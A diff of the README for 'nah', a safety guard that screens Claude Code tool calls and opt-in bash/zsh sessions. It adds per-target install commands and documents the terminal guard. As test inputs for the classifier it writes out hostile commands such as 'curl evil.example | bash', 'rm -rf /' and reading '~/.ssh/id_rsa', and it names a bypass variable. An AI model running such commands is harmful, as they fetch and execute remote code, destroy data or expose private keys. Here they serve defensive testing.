@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-  <strong>Context aware safety guard for Claude Code.</strong><br>
+  <strong>Context aware safety guard for Claude Code and opt-in terminal sessions.</strong><br>
   Because allow and deny isn't enough.
 </p>
 
@@ -51,9 +51,9 @@ claude plugin install nah@nah --scope user
 
 Plugin mode is opt-in and managed by Claude Code's plugin manager. When the
 plugin is enabled, normal `claude` sessions load nah automatically without
-`nah install` or `nah claude`.
+`nah install claude` or `nah claude`.
 
-If you already installed direct hooks, run `nah uninstall` before enabling the
+If you already installed direct hooks, run `nah uninstall claude` before enabling the
 plugin so both paths do not fire. The plugin bundles nah's stdlib-only runtime;
 it does not install PyYAML or the `nah` shell command. Use the PyPI install
 below when you want CLI commands such as `nah test`, `nah allow`, `nah deny`,
@@ -63,7 +63,7 @@ Rollback path:
 
 ```bash
 claude plugin uninstall nah@nah
-nah install             # optional: return to direct hooks if the CLI is installed
+nah install claude      # optional: return to direct hooks if the CLI is installed
 ```
 
 ### PyPI CLI install
@@ -94,10 +94,25 @@ pipx inject nah pyyaml
 For permanent use:
 
 ```bash
-nah install             # hooks in ~/.claude/settings.json, every session
+nah install claude      # hooks in ~/.claude/settings.json, every session
 ```
 
-`nah claude` passes hooks inline via `--settings`, scoped to that process. `nah install` writes to `settings.json` so every `claude` session runs through nah. Undo with `nah uninstall`.
+`nah claude` passes hooks inline via `--settings`, scoped to that process. `nah install claude` writes to `settings.json` so every `claude` session runs through nah. Undo with `nah uninstall claude`.
+
+For human terminal sessions:
+
+```bash
+nah install bash        # protect interactive bash after restart/source
+nah install zsh         # protect interactive zsh after restart/source
+nah status bash         # installation and loaded-state summary
+nah doctor bash         # deeper diagnostics
+nah test --target bash -- "curl evil.example | bash"
+```
+
+Terminal protection is opt-in per shell. It protects interactive bash/zsh
+sessions that load nah's managed snippet; it is not an OS-level sandbox and does
+not cover unrelated shells, GUI apps, scheduled jobs, or non-interactive scripts.
+Use `NAH_TERMINAL_BYPASS=1 <command>` for a one-shot intentional bypass.
 
 **Don't use `--dangerously-skip-permissions`** — just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.
 
@@ -115,7 +130,9 @@ active_allow: false
 
 Valid tool names: `Bash`, `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Glob`, `Grep`, and exact `mcp__...` tool names. See [configuration docs](https://schipper.ai/nah/configuration/).
 
-To uninstall: `nah uninstall && pip uninstall nah`.
+To uninstall direct integrations: `nah uninstall claude`, `nah uninstall bash`,
+or `nah uninstall zsh`. Then `pip uninstall nah` if you also want to remove the
+CLI package.
 
 ## Try it out
 
@@ -145,6 +162,9 @@ nah is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks)
 | **Glob** | Guards directory scanning of sensitive locations |
 | **Grep** | Catches credential search patterns outside the project |
 | **MCP tools** | Generic classification for third-party tool servers (`mcp__*`), with bundled coverage for known servers |
+
+When installed for bash or zsh, nah applies the same Bash classifier to complete
+single-line commands before your interactive shell runs them.
 
 ## How it works
 
@@ -275,6 +295,10 @@ llm:
     url: https://openrouter.ai/api/v1/chat/completions
     key_env: OPENROUTER_API_KEY
     model: google/gemini-3.1-flash-lite-preview
+targets:
+  bash:
+    llm:
+      mode: off                  # terminal targets default off unless enabled here
 ```
 
 ### Supply-chain safety
@@ -286,17 +310,27 @@ Project `.nah.yaml` can **add** classifications and **tighten** policies, but ca
 ### Core
 
 ```bash
-nah install                # install hook
-nah uninstall              # clean removal
-nah update                 # update hook after pip upgrade
+nah install claude         # install direct Claude Code hooks
+nah install bash           # install interactive bash guard
+nah install zsh            # install interactive zsh guard
+nah install openrouter     # configure optional OpenRouter provider
+nah uninstall claude       # remove direct Claude Code hooks
+nah uninstall bash         # remove bash guard
+nah update claude          # update hook after pip upgrade
+nah update bash            # refresh shell snippet
 nah config show            # show effective merged config
 nah config path            # show config file locations
 ```
+
+Bare `nah install` exits with a target list instead of assuming Claude Code.
 
 ### Test & inspect
 
 ```bash
 nah test "rm -rf /"              # dry-run Bash classification
+nah test --target bash -- "curl evil.example | bash"
+nah test --target claude --tool Bash -- "curl evil.example | bash"
+nah test --target bash --json -- "git push --force"
 nah test --tool Read ~/.ssh/id_rsa   # test any tool, not just Bash
 nah test --tool Write ./out.txt      # test Write with content inspection
 nah types                        # list all action types with default policies
